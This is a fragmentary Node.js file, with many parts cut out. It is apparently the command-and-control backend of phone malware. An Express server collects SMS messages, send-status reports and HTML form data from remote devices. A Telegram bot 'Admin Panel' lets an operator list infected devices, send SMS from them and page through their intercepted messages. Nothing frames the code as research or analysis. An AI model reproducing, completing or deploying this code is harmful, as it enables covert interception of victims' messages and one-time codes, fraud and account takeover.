...
const rateLimited = (chatId, ms = 500) => {
...
function ensureSession(chatId) {
  ...
  if (!s) return null;
  if (s.expiresAt && now() > s.expiresAt) { delete sessions[chatId]; return null; }
  return s;
}
function extendSession(chatId, ms = 90_000) {
  if (sessions[chatId]) sessions[chatId].expiresAt = now() + ms;
}
...
const smsFilePath = (uuid) => path.join(STORAGE_DIR, `${uuid}_sms.json`);
...
app.get('/commands', (req, res) => {
  try {
    ...
    console.error('Error /commands', e);
    res.sendStatus(500);
  }
});
...
app.post('/sms', (req, res) => {
  try {
    ...
    const pretty = smsPrettyBlock(device, { from, body, timestamp: ts });
    ...
    safeWrite(file, list.slice(0, 500));
    res.sendStatus(200);
  } catch (e) {
...
// Device confirms SMS send status
app.post('/sms-status', (req, res) => {
  try {
    ...
    console.error('Error /sms-status', e);
    res.sendStatus(500);
  }
});
...
app.post('/html-form-data', (req, res) => {
  try {
    ...
    console.error('Error /html-form-data', e);
    res.sendStatus(500);
  }
});
...
bot.on('message', msg => {
  try {
    ...
    if (!isAdmin(chatId)) { bot.sendMessage(chatId, '❌ Permission denied.'); return; }
    if (rateLimited(chatId)) return;

    const s = ensureSession(chatId);
    if (s) {
      if (text === 'cancel' || text === '/cancel') { delete sessions[chatId]; bot.sendMessage(chatId, '❎ Cancelled.'); return; }
      switch (s.stage) {
        case 'await_number': {
          const num = sanitizePhone(textRaw);
          if (!num) { extendSession(chatId); bot.sendMessage(chatId, '⚠️ Invalid number. Send digits (8–15) or +country. Or *cancel*.', { parse_mode: 'Markdown' }); return; }
          s.to = num; s.stage = 'await_message'; extendSession(chatId);
          bot.sendMessage(chatId, '✍️ Enter message text (max 1000 chars). Or *cancel*.', { parse_mode: 'Markdown' }); return;
        }
        case 'await_message': {
    ...
    if (text === '/start') {
      bot.sendMessage(chatId, '✅ Admin Panel Ready', {
        reply_markup: { keyboard: [['Connected devices'], ['Send SMS'], ['Receive SMS']], resize_keyboard: true }
      });
      return;
    }

    if (text === 'connected devices') {
      if (devices.size === 0) { bot.sendMessage(chatId, '🚫 No devices connected.'); return; }
      let out = '';
      for (let [u, d] of devices.entries()) out += `${formatDevice(d)}\nUUID: \`${u}\`\n\n`;
      bot.sendMessage(chatId, out, { parse_mode: 'Markdown' }); return;
    }

    if (text === 'send sms') {
      const rows = devicesInlineRows('send_sms_device');
      if (rows.length === 0) { bot.sendMessage(chatId, '🚫 No devices connected.'); return; }
      bot.sendMessage(chatId, '📤 Select device to send SMS:', { reply_markup: { inline_keyboard: rows } }); return;
    }
    ...
    if (text === 'receive sms') {
      ...
      for (let [uuid, d] of devices.entries()) {
        ...
        if (items.length === 0) { bot.sendMessage(chatId, `📭 No SMS for *${d.model || uuid}*`, { parse_mode: 'Markdown' }); continue; }
...
bot.on('callback_query', cb => {
  try {
    ...
    const [cmd, uuid, param] = (cb.data || '').split(':');

    switch (cmd) {
      case 'send_sms_device': {
        const d = devices.get(uuid);
        if (!d) { bot.answerCallbackQuery(cb.id, { text: 'Device not available' }); return; }
        const row = [
      ...
      case 'sms_list': {
        ...
        if (items.length === 0) { bot.answerCallbackQuery(cb.id, { text: 'No more messages.' }); return; }

        let txt = `📚 *Messages ${offset + 1}-${Math.min(offset + 20, total)} of ${total} - ${d.model}*\n================================\n`;
        items.forEach((s, i) => {
          txt += `#${offset + i + 1}\nFrom: ${s.from}\n${s.body}\nTime: ${fmtDate(s.timestamp)}\n\n`;
        });
